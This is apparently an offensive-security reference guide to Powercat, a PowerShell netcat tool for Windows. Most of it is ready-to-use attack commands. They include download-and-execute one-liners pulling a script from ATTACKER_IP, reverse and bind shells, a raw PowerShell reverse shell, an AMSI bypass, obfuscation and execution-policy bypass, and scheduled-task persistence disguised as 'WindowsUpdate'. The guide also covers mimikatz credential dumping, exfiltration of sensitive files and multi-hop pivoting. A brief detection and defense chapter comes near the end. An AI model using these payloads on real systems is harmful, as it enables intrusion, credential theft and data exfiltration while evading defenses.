---
title: "Powercat - PowerShell Netcat"
description: "PowerShell implementation of netcat for Windows reverse shells, file transfers, and port scanning"
category: "reverse_shells"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
language: "PowerShell"
platform: "Windows"
---

# Powercat

## Overview

Powercat is a PowerShell implementation of netcat designed for Windows environments. It provides reverse shells, bind shells, port scanning, and file transfer capabilities without requiring external executables. Powercat runs entirely in memory using PowerShell's scripting capabilities, making it ideal for Windows penetration testing where executing dropped binaries may be detected.

## Chapter 1: Installation

### Import Directly

```powershell
IEX (New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1')
```

### Download and Import

```powershell
# Download the script
Invoke-WebRequest -Uri "http://ATTACKER_IP/powercat.ps1" -OutFile "C:\Temp\powercat.ps1"

# Import the function
. .\powercat.ps1
```

### Verify Installation

```powershell
powercat -h
```

## Chapter 2: Basic Usage

### Reverse Shell

```powershell
# Target
powercat -c ATTACKER_IP -p 4444 -e cmd.exe

# Attacker (netcat listener)
nc -lvnp 4444
```

**Explanation**: Powercat connects to the attacker's netcat listener and executes `cmd.exe`, providing a Windows command prompt through the network connection.

### Bind Shell

```powershell
# Target
powercat -l -p 4444 -e cmd.exe

# Attacker
nc 192.168.1.100 4444
```

**Explanation**: Powercat listens for incoming connections on port 4444 and provides a command prompt to whoever connects.

### Port Scanning

```powershell
powercat -c 192.168.1.1 -p 1-1000 -o
```

**Explanation**: Scans TCP ports 1 through 1000 on the target, reporting open ports. The `-o` flag outputs scan results.

## Chapter 3: Reverse Shells

### PowerShell Reverse Shell

```powershell
# Target
powercat -c ATTACKER_IP -p 4444 -e powershell.exe

# Attacker
nc -lvnp 4444
```

**Explanation**: Provides a PowerShell session instead of cmd.exe, enabling access to PowerShell cmdlets and .NET framework on the target system.

### Encoded Reverse Shell

```powershell
# Generate encoded command
$cmd = 'powercat -c ATTACKER_IP -p 4444 -e cmd.exe'
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -enc $encoded
```

**Explanation**: The command is Base64-encoded to avoid detection by basic string matching. The encoded payload is executed via PowerShell's `-enc` parameter, bypassing simple command-line logging.

### Reverse Shell with DNS

```powershell
powercat -c dns.domain.com -p 4444 -e cmd.exe -dns
```

**Explanation**: The `-dns` flag resolves the hostname via DNS before connecting, providing an additional layer of indirection and potentially bypassing IP-based filtering.

## Chapter 4: File Transfer

### Send File

```powershell
# Sender
powercat -c ATTACKER_IP -p 4444 -i C:\path\to\file.txt

# Receiver
nc -lvnp 4444 > received_file.txt
```

**Explanation**: Transfers a file from the Windows target to the attacker's machine through the network connection.

### Receive File

```powershell
# Receiver
powercat -l -p 4444 -i C:\path\to\save\file.txt

# Sender
nc 192.168.1.100 4444 < file_to_send.txt
```

**Explanation**: The target receives a file from the attacker through the established connection.

## Chapter 5: Advanced Techniques

### Relayed Connection

```powershell
powercat -c ATTACKER_IP -p 4444 -ep 5555 -r
```

**Explanation**: The `-ep` flag specifies an additional endpoint, and `-r` enables relay mode. Data received on one connection is forwarded to the other, enabling multi-hop pivoting.

### UDP Mode

```powershell
powercat -c ATTACKER_IP -p 4444 -u
```

**Explanation**: The `-u` flag switches to UDP mode. UDP connections do not require a formal handshake, which can be useful for certain network scenarios.

### Connection Timeout

```powershell
powercat -c ATTACKER_IP -p 4444 -e cmd.exe -t 10
```

**Explanation**: The `-t` flag sets a 10-second connection timeout. If the connection is not established within this period, powercat exits. This prevents indefinite hanging on unreachable hosts.

## Chapter 6: Evasion Techniques

### In-Memory Execution

```powershell
# Download and execute in memory
IEX (New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1')
powercat -c ATTACKER_IP -p 4444 -e cmd.exe
```

**Explanation**: Powercat is downloaded and executed directly in memory without writing to disk. This technique evades file-based detection mechanisms and leaves minimal forensic artifacts.

### AMSI Bypass

```powershell
# Bypass AMSI (Anti-Malware Scan Interface)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Explanation**: The AMSI bypass prevents PowerShell from sending script content to the Windows Defender AMSI interface for scanning. This must be executed before importing powercat to avoid detection.

### Obfuscated Execution

```powershell
# Reverse shell with string obfuscation
$a = 'power' + 'cat'
$b = '-c'
$c = 'ATTACKER_IP'
& $a $b $c -p 4444 -e cmd.exe
```

**Explanation**: Breaking the command string into parts prevents static analysis tools from detecting the full command. The command is reconstructed at runtime.

## Chapter 7: Practical Scenarios

### Domain Enumeration

```powershell
powercat -c ATTACKER_IP -p 4444 -e powershell.exe

# On target
Get-ADUser -Filter * -Properties Name,Email
Get-ADGroup -Filter * | Select Name
nltest /dclist:
```

**Explanation**: Once a PowerShell session is established, Active Directory enumeration commands reveal domain users, groups, and domain controllers.

### File Exfiltration

```powershell
# Compress and transfer
Compress-Archive -Path C:\sensitive\* -DestinationPath C:\Temp\data.zip
powercat -c ATTACKER_IP -p 4444 -i C:\Temp\data.zip
```

**Explanation**: Sensitive files are compressed and transferred to the attacker's machine. The ZIP archive reduces transfer time and bundles related files.

## Chapter 8: Limitations and Considerations

### PowerShell Execution Policy

```powershell
# Bypass execution policy
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1')"
```

**Explanation**: The `-ep bypass` flag overrides the PowerShell execution policy, allowing the script to run even when execution policies are restricted.

### 32-bit vs 64-bit

```powershell
# Force 32-bit PowerShell
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1')"
```

**Explanation**: Some applications require 32-bit PowerShell. Using the SysWOW64 path ensures the 32-bit version is used, which may be necessary for compatibility with certain DLLs or COM objects.

## Chapter 9: Real-World Scenarios

### Full Windows Penetration Test

```powershell
# 1. Initial Access (via phishing email, RCE, etc.)
# On attacker: nc -lvnp 4444

# On target Windows machine:
IEX (New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1')
powercat -c ATTACKER_IP -p 4444 -e cmd.exe

# 2. Upgrade to PowerShell session
# On attacker shell:
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1')"
powercat -c ATTACKER_IP -p 4444 -e powershell.exe

# 3. Enumerate domain
Get-ADUser -Filter * -Properties Name,Email
Get-ADGroup -Filter * | Select Name
nltest /dclist:
whoami /all
systeminfo

# 4. Transfer tools
# On attacker: nc -lvnp 4445 < mimikatz.exe
powercat -c ATTACKER_IP -p 4445 -i C:\temp\mimikatz.exe

# 5. Run mimikatz
C:\temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 6. Exfiltrate data
Compress-Archive -Path C:\sensitive\* -DestinationPath C:\Temp\data.zip
powercat -c ATTACKER_IP -p 4446 -i C:\Temp\data.zip
```

### Persistence with Powercat

```powershell
# Create scheduled task that runs powercat on startup
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -c `"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1'); powercat -c ATTACKER_IP -p 4444 -e cmd.exe`""
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsUpdate"
```

### Encoded Payload for Evasion

```powershell
# Generate Base64-encoded payload
$payload = "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1'); powercat -c ATTACKER_IP -p 4444 -e cmd.exe"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))

# Execute on target
powershell -ep bypass -enc $encoded
```

### Multi-Hop Pivoting

```powershell
# On compromised host 1 (pivot)
powercat -c ATTACKER_IP -p 4444 -ep 5555 -r

# On compromised host 2
powercat -c HOST1_IP -p 5555 -ep 6666 -r

# Attacker connects to host2
nc HOST2_IP 6666
```

### File Exfiltration with Verification

```powershell
# On attacker
nc -lvnp 4444 | tee received_file.txt | md5sum

# On target
powercat -c ATTACKER_IP -p 4444 -i C:\sensitive\data.zip

# Compare hashes to verify integrity
```

---

## Chapter 10: Command Reference

### Powercat Parameters

| Parameter | Description |
|---|---|
| `-c <ip>` | Connect to IP address |
| `-p <port>` | Port number |
| `-l` | Listen mode |
| `-e <program>` | Execute program (cmd.exe, powershell.exe) |
| `-ep <port>` | Endpoint port for relay mode |
| `-r` | Relay mode |
| `-u` | UDP mode |
| `-i <file>` | Input file for transfer |
| `-o <file>` | Output file for scan |
| `-t <seconds>` | Connection timeout |
| `-dns` | Use DNS for hostname resolution |
| `-dnsft <suffix>` | DNS suffix for resolution |
| `-enc <string>` | Base64-encoded command |
| `-g` | Generate encoded payload |
| `-h` | Help |

### Common Payloads

| Payload | Description |
|---|---|
| `cmd.exe` | Windows command prompt |
| `powershell.exe` | PowerShell session |
| `cmd.exe /c <command>` | Execute single command |

### Port Reference

| Port | Service |
|---|---|
| 4444 | Default reverse shell |
| 53 | DNS (covert) |
| 80 | HTTP (covert) |
| 443 | HTTPS (covert) |
| 3389 | RDP (covert) |

---

## Chapter 11: Detection and Defense

### Network Signatures

- PowerShell making outbound TCP connections
- Unusual PowerShell User-Agent strings
- Connections to non-standard ports from PowerShell processes
- Base64-encoded commands in PowerShell execution

### Host-Based Detection

```powershell
# Monitor for suspicious PowerShell network activity
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} |
  Where-Object {$_.Message -like "*powercat*" -or $_.Message -like "*DownloadString*"}

# Check for outbound connections from PowerShell
netstat -ano | findstr "powershell"
Get-Process powershell | Select-Object Id, ProcessName, Path
```

### Defense Recommendations

1. Enable PowerShell script block logging
2. Implement application whitelisting for PowerShell
3. Monitor for outbound TCP connections from PowerShell
4. Use PowerShell Constrained Language Mode
5. Deploy EDR with PowerShell monitoring capabilities

### AMSI Detection

```powershell
# Check for powercat in AMSI logs
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Defender/Operational'; ID=1116} |
  Where-Object {$_.Message -like "*powercat*"}
```

### PowerShell Execution Policy

```powershell
# Check execution policy
Get-ExecutionPolicy -List

# Set to Restricted (default)
Set-ExecutionPolicy Restricted

# Monitor for policy bypass
Get-WinEvent -FilterHashtable @{LogName='Windows PowerShell'; ID=800} |
  Where-Object {$_.Message -like "*bypass*"}
```

---

## Appendix: Quick Reference Card

### One-Liner Payloads

```powershell
# Reverse shell
powercat -c ATTACKER_IP -p 4444 -e cmd.exe

# Encoded reverse shell
$IEX = "powercat -c ATTACKER_IP -p 4444 -e cmd.exe"; $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($IEX)); powershell -enc $enc

# Download and execute in memory
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1'); powercat -c ATTACKER_IP -p 4444 -e cmd.exe

# File transfer
powercat -c ATTACKER_IP -p 4444 -i C:\sensitive\data.zip
```

### Common PowerShell Reverse Shells

```powershell
# PowerShell without powercat
powershell -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### File Transfer Commands

| Command | Description |
|---|---|
| `powercat -c IP -p PORT -i FILE` | Send file |
| `powercat -l -p PORT -i FILE` | Receive file |
| `nc IP PORT < FILE` | Send file (Linux) |
| `nc -lvnp PORT > FILE` | Receive file (Linux) |

### Evasion Techniques Summary

| Technique | Command |
|---|---|
| In-memory execution | `IEX (New-Object Net.WebClient).DownloadString('URL')` |
| AMSI bypass | `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` |
| Encoded payload | `powershell -enc <Base64String>` |
| String obfuscation | `$a = 'power' + 'cat'` |
| 32-bit PowerShell | `C:\Windows\SysWOW64\...\powershell.exe` |
| Execution policy bypass | `powershell -ep bypass` |

### Port Configuration for Covert Operations

```powershell
# Common ports for covert reverse shells
# Port 53 (DNS) - Often allowed through firewalls
powercat -c ATTACKER_IP -p 53 -e cmd.exe

# Port 80 (HTTP) - Almost always allowed
powercat -c ATTACKER_IP -p 80 -e cmd.exe

# Port 443 (HTTPS) - Almost always allowed
powercat -c ATTACKER_IP -p 443 -e cmd.exe

# Port 445 (SMB) - Often allowed in Windows environments
powercat -c ATTACKER_IP -p 445 -e cmd.exe
```

### Troubleshooting Common Issues

```powershell
# If powercat import fails
# 1. Check execution policy
Get-ExecutionPolicy

# 2. Verify script is downloaded
Test-Path "C:\temp\powercat.ps1"

# 3. Import with explicit path
. "C:\temp\powercat.ps1"

# 4. Check for AMSI blocking
# If AMSI is blocking, run bypass first
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## Resources

- [Powercat GitHub Repository](https://github.com/besimorhino/powercat)
- [PowerShell Documentation](https://docs.microsoft.com/en-us/powershell/)
- [PowerShell AMSI Bypass Techniques](https://amsi.fail/)
- [MITRE ATT&CK - Command and Control](https://attack.mitre.org/tactics/TA0011/)
- [MITRE ATT&CK - PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [MITRE ATT&CK - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
- [MITRE ATT&CK - Remote Services](https://attack.mitre.org/techniques/T1021/)
